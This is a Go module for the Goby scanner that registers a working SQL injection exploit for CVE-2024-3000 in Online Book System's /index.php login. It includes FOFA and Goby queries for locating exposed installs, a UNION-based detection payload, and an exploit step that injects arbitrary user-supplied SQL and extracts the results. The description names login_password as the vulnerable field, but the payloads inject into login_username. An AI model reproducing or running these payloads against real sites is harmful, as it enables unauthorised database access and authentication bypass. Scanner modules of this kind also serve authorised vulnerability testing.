package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Online Book System /index.php SQL Injection Vulnerability (CVE-2024-3000)",
    "Description": "<p>Online Book System is a PHP, CSS, JS, and MySQL-based online book management system. The /index.php interface is vulnerable to SQL injection. Attackers can send specially crafted SQL queries to the 'login_password' parameter to bypass authentication and access sensitive information. This vulnerability may lead to database leaks, data tampering, or remote code execution.</p>",
    "Product": "Online Book System",
    "Homepage": "https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2025-01-16",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title==\"Online Bookstore\" || body=\"js/bootstrap.min.js\" && body=\"Product.php?value=entrance\"",
    "GobyQuery": "title==\"Online Bookstore\" || body=\"js/bootstrap.min.js\" && body=\"Product.php?value=entrance\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the SQL injection vulnerability to bypass authentication, access or modify sensitive information in the database, and potentially execute remote code, posing a severe threat to the system's integrity and confidentiality.</p>",
    "Recommendation": "<p>1. Use parameterized queries or prepared statements to prevent SQL injection.2. Strictly validate and sanitize user inputs.3. Limit database user permissions to ensure the principle of least privilege.4. Upgrade to the latest version of Online Book System and apply security patches provided by the vendor.</p>",
    "References": [
        "https://github.com/BurakSevben/CVEs/blob/main/Online%20Book%20System/Online%20Book%20System-%20SQL%20Injection%20-%202.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "sec-ch-ua": "Not A(Brand;v=24, Chromium;v=110",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "Linux",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "login_username=1' UNION ALL SELECT CONCAT(0x717a627871,md5(123),0x71707a7871),NULL-- -&login_password=123&submit=login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36"
                },
                "data_type": "text",
                "data": "login_username=1' UNION ALL SELECT CONCAT(0x717a627871,concat(0x7e7e7e,({{{payload}}}),0x7e7e7e),0x71707a7871),NULL-- -&login_password=123&submit=login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-3000"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "Online Book System /index.php SQL 注入漏洞 （CVE-2024-3000）",
            "Product": "Online Book System",
            "Description": "<p>Online Book System 是一个基于 PHP、CSS、JS 和 MySQL 的在线书籍管理系统。该系统的 /index.php 接口存在 SQL 注入漏洞，攻击者可以通过向 'login_password' 参数发送特制的 SQL 查询，绕过身份验证并获取敏感信息。此漏洞可能导致数据库泄露、数据篡改或远程代码执行。</p>",
            "Recommendation": "<p>1. 使用参数化查询或预编译语句以防止 SQL 注入。2. 对用户输入进行严格的验证和过滤。3. 限制数据库用户权限，确保最小权限原则。4. 升级到最新版本的 Online Book System，并应用厂商提供的安全补丁。</p>",
            "Impact": "<p>攻击者可以利用 SQL 注入漏洞绕过身份验证，访问或修改数据库中的敏感信息，甚至可能导致远程代码执行，对系统的完整性和机密性构成严重威胁。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Online Book System /index.php SQL Injection Vulnerability (CVE-2024-3000)",
            "Product": "Online Book System",
            "Description": "<p>Online Book System is a PHP, CSS, JS, and MySQL-based online book management system. The /index.php interface is vulnerable to SQL injection. Attackers can send specially crafted SQL queries to the 'login_password' parameter to bypass authentication and access sensitive information. This vulnerability may lead to database leaks, data tampering, or remote code execution.</p>",
            "Recommendation": "<p>1. Use parameterized queries or prepared statements to prevent SQL injection.2. Strictly validate and sanitize user inputs.3. Limit database user permissions to ensure the principle of least privilege.4. Upgrade to the latest version of Online Book System and apply security patches provided by the vendor.</p>",
            "Impact": "<p>Attackers can exploit the SQL injection vulnerability to bypass authentication, access or modify sensitive information in the database, and potentially execute remote code, posing a severe threat to the system's integrity and confidentiality.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
